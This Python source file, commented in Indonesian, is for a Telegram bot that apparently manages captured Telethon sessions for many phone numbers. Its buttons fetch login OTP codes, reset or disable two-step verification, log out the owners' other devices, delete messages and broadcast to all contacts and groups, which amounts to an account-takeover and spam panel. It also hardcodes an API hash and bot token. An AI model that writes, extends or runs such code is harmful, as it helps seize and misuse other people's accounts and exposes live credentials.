import asyncio
import hashlib
import math
import os
import pytz
from datetime import datetime
from warnings import filterwarnings
from configparser import ConfigParser
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ConversationHandler, filters, ContextTypes
from telegram.helpers import escape_markdown
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# Import file lain
from conversation_states import SET_PASSWORD
from get_otp import get_otp_handler
from sesi_aktif import sesi_aktif_handler
from data_kontak import data_kontak_handler
from hapus_pesan import hapus_pesan_handler
from set_password_handler import receive_confirmation, start_set_password, cancel_password
from logout_device import logout_other_devices
from broadcast import broadcast_via_dialog_handler
from security import check_2fa_status, remove_and_set_2fa
from disable_2fa import disable_2fa
from user_settings import update_interval_settings, stats_users

# Konfigurasi
API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'a2_sessions/active'))
os.makedirs(SESSION_FOLDER, exist_ok=True)

# ===== Fungsi Utility =====

def get_registered_sessions():
    return sorted(f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session'))

async def send_message_with_eraser(update_or_query, text, parse_mode=None, reply_markup=None):
    keyboard = reply_markup.inline_keyboard if reply_markup else []
    # Tidak menggunakan tombol eraser lagi di sini
    new_markup = InlineKeyboardMarkup(keyboard)

    if hasattr(update_or_query, "reply_text"):
        await update_or_query.reply_text(text, parse_mode=parse_mode, reply_markup=new_markup)
    elif hasattr(update_or_query, "edit_message_text"):
        await update_or_query.edit_message_text(text, parse_mode=parse_mode, reply_markup=new_markup)

# ===== Handler Command /user =====

async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 0)

async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    sessions = get_registered_sessions()
    per_page = 10
    total_pages = math.ceil(len(sessions) / per_page)
    start = page * per_page
    end = start + per_page
    current_sessions = sessions[start:end]

    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_sessions]
    page_buttons = [InlineKeyboardButton(f"[{p+1}]" if p == page else str(p+1), callback_data=f"page_{p}") for p in range(total_pages)]
    keyboard.append(page_buttons)

    markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text("📱 Pilih nomor:", reply_markup=markup)
    else:
        await update.message.reply_text("📱 Pilih nomor:", reply_markup=markup)

# ===== Handle Select Nomor =====

async def handle_select_number(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()
        me = await client.get_me()
        await client.disconnect()

        full_name = escape_markdown((me.first_name or '') + ' ' + (me.last_name or ''), version=2) or 'Tidak ada nama'
        username = escape_markdown(me.username or 'Tidak ada username', version=2)
        bio = escape_markdown(me.bot and 'Bot Telegram' or me.phone or 'Tidak ada bio', version=2)
        location = escape_markdown(me.lang_code.upper() if me.lang_code else 'Tidak diketahui', version=2)
        local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')
        escaped_phone = escape_markdown(phone_number, version=2)

        info = (
            f"👤 *Info Akun*\n\n"
            f"🔹 *Nama*: {full_name}\n"
            f"🔹 *Username*: @{username}\n"
            f"🔹 *Bio*: {bio}\n"
            f"🔹 *Lokasi*: {location}\n"
            f"🕒 *Waktu*: {escape_markdown(local_time, version=2)} WIB\n\n"
            f"📱 Nomor: `{escaped_phone}`\n\nPilih aksi di bawah:"
        )

    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal mengambil info akun:\n`{escape_markdown(str(e), version=2)}`", parse_mode='MarkdownV2')
        return

    keyboard = [
        [
            InlineKeyboardButton("🔐 GET OTP", callback_data=f"getotp_{phone_number}"),
            InlineKeyboardButton("🟢 SESI AKTIF", callback_data=f"sesi_{phone_number}")
        ],
        [
            InlineKeyboardButton("🔒 Verifikasi 2FA", callback_data=f"verify_2fa_menu_{phone_number}"),
            InlineKeyboardButton("📢 BROADCAST", callback_data=f"broadcast_{phone_number}")
        ],
        [
            InlineKeyboardButton("❌LOGOUT DEVICE", callback_data=f"logout_{phone_number}"),
            InlineKeyboardButton("🧹 HAPUS PESAN", callback_data=f"hapuspesan_{phone_number}")
        ]
    ]

    await update.callback_query.message.reply_text(info, parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup(keyboard))

# ===== Semua Handler Tombol CallbackQuery =====

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    # Menghapus pesan setelah setiap aksi
    try:
        # Cobalah menghapus pesan bot setelah aksi selesai
        await query.message.delete()
    except Exception as e:
        await query.message.reply_text(f"⚠️ Gagal menghapus pesan: {e}")

    # Proses sesuai callback data
    if data.startswith("page_"):
        await send_session_list(update, context, int(data.split("_")[1]))

    elif data.startswith("select_"):
        await handle_select_number(update, context, data.split("_", 1)[1])

    elif data.startswith("getotp_"):
        await get_otp_handler(update, context, data.split("_", 1)[1])

    elif data.startswith("sesi_"):
        await sesi_aktif_handler(update, context, data.split("_", 1)[1])

    elif data.startswith("hapuspesan_"):
        await hapus_pesan_handler(update, context, data.split("_", 1)[1])

    elif data.startswith("logout_"):
        await handle_logout_device(update, context, data.split("_", 1)[1])

    elif data.startswith("broadcast_"):
        phone_number = data.split("_", 1)[1]
        keyboard = [
            [InlineKeyboardButton("📨 Semua", callback_data=f"broadcastmode_all_{phone_number}"),
             InlineKeyboardButton("👥 Kontak", callback_data=f"broadcastmode_contact_{phone_number}")],
            [InlineKeyboardButton("🟢 Grup", callback_data=f"broadcastmode_group_{phone_number}")],
        ]
        await query.message.reply_text("Pilih mode broadcast:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("broadcastmode_"):
        _, mode, phone_number = data.split("_", 2)
        await broadcast_via_dialog_handler(update, context, phone_number, mode)

    elif data.startswith("verify_2fa_menu_"):
        phone_number = data.split("_", 3)[3]
        keyboard = [
            [InlineKeyboardButton("🔐 Cek/Ganti 2FA", callback_data=f"check_2fa_{phone_number}")],
            [InlineKeyboardButton("♻️ Reset dan Setel Ulang 2FA", callback_data=f"reset_2fa_{phone_number}")],
            [InlineKeyboardButton("❌ Nonaktifkan 2FA", callback_data=f"disable_2fa_{phone_number}")],
        ]
        await query.message.reply_text(f"🔐 Pilih tindakan untuk 2FA `{phone_number}`:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("check_2fa_"):
        await check_2fa_status(update, context, data.split("_", 2)[2])

    elif data.startswith("reset_2fa_"):
        await remove_and_set_2fa(update, context, data.split("_", 2)[2])

    elif data.startswith("disable_2fa_"):
        await disable_2fa(update, context, data.split("_", 2)[2])

# ===== Handle Logout Devices =====

async def handle_logout_device(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        await logout_other_devices(session_path)
        await update.callback_query.message.reply_text(f"🔴 Semua perangkat selain utama telah logout.")
    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal logout: {e}")

# ===== Main =====

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("user", user_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(ConversationHandler(
        entry_points=[CommandHandler('set_password', start_set_password)],
        states={SET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_confirmation)]},
        fallbacks=[]
    ))

    print("✅ Bot aktif...")
    application.run_polling()

if __name__ == "__main__":
    main()
